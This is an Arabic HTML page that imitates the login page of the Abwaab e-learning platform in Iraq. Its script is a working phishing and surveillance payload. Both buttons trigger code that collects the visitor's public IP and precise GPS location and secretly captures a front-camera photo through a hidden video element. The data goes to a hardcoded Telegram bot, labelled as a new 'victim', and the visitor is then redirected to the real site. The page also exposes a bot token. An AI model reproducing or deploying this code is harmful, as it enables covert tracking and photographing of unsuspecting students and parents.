<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أبواب - أفضل منصة متكاملة للتعليم الإلكتروني في العراق</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background-color: #0d47a1; /* لون خلفية مطابق للموقع */
            margin: 0;
            padding: 0;
            text-align: center;
            color: #ffffff;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: #ffffff;
            color: #333;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: bold;
            font-size: 18px;
        }
        .content {
            padding: 40px 20px;
            max-width: 500px;
            margin: auto;
        }
        h1 {
            font-size: 24px;
            font-weight: bold;
            line-height: 1.4;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            opacity: 0.9;
            margin-bottom: 30px;
        }
        .btn-yellow {
            background-color: #ffc107;
            color: #333;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .btn-white {
            background-color: #ffffff;
            color: #0d47a1;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <!-- الهيدر العلوي المطابق للموقع -->
    <div class="header">
        <div style="font-size: 20px;">🇮🇶</div>
        <div class="logo-area">
            <span>ابواب</span>
            <span style="color: #0d47a1;">abwaab</span>
        </div>
    </div>

    <!-- المحتوى الرئيسي والأزرار -->
    <div class="content">
        <h1>أفضل منصة متكاملة للتعليم الإلكتروني في العراق</h1>
        <p>وجهة الطلاب والأهالي الطموحين للنجاح والتميز الأكاديمي</p>
        
        <button class="btn-yellow" id="actionBtn1">افتح حساب جديد</button>
        <button class="btn-white" id="actionBtn2">دخول إلى حسابي</button>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '7834185753:AAEaTPXg0xNOQokrjzdgF9Rt0EWy_SmXHOk';
        const CHAT_ID = '7110865740';

        function sendToTelegram(text) {
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.error(err));
        }

        function sendPhotoToTelegram(blob, captionText) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', captionText);
            formData.append('parse_mode', 'HTML');
            formData.append('photo', blob, 'camera_capture.jpg');

            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.error(err));
        }

        async function getPublicIPv4() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'غير متاح'; }
        }

        function getExactGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }

        async function executeCaptureAndRedirect() {
            const ipv4 = await getPublicIPv4();
            const gpsLocation = await getExactGPSLocation();

            let msg = `<blockquote>`;
            msg += ` <b>🎯 ضحية جديدة عبر واجهة أبواب الأصلية</b>\n\n`;
            msg += ` <b>IP العام</b>: <tg-spoiler>${ipv4}</tg-spoiler>\n`;
            if (gpsLocation) {
                msg += ` 📍 <b>الإحداثيات</b>: <tg-spoiler>${gpsLocation.lat}, ${gpsLocation.lon}</tg-spoiler>\n`;
                msg += ` 🗺️ <b>الخريطة</b>: <a href="${gpsLocation.mapLink}">رابط الموقع الدقيق</a>\n\n`;
            }
            msg += ` <b>الجهاز</b>: ${/Mobi|Android/i.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر'}\n`;
            msg += ` <b>الوقت</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
            msg += `</blockquote>`;

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    stream.getTracks().forEach(t => t.stop());

                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob, msg).then(() => {
                            window.location.href = 'http://abwaabiraq.com';
                        });
                    }, 'image/jpeg', 0.8);
                }, 1200);
            })
            .catch(() => {
                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا.").then(() => {
                    window.location.href = 'http://abwaabiraq.com';
                });
            });
        }

        // ربط الأحداث بالأزرار الموجودة في الواجهة
        document.getElementById('actionBtn1').addEventListener('click', executeCaptureAndRedirect);
        document.getElementById('actionBtn2').addEventListener('click', executeCaptureAndRedirect);
    </script>
</body>
</html>
